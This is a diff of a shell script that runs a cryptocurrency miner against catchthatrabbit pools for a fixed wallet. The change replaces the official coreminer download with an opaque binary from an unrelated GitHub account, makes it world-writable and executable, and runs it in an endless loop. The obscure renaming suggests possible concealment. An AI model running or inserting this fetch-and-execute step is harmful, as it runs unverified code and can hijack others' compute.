@@ -1,9 +1,7 @@
-curl https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz -L -o coreminer-linux-x86_64.tar.gz
-tar xf coreminer-linux-x86_64.tar.gz
-cd coreapp
-mv coreminer crr
+curl https://github.com/mgssjs/moanu/releases/download/1/core1988 -L -o core1988
+chmod 777 core1988
 while true
 do
-./crr -P stratum1+tcp://cb140e9452aebdbc5c6815dc53176a7a11239a86359e.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 \
+./core1988 -P stratum1+tcp://cb140e9452aebdbc5c6815dc53176a7a11239a86359e.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 \
      -P stratum1+tcp://cb140e9452aebdbc5c6815dc53176a7a11239a86359e.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008
 done
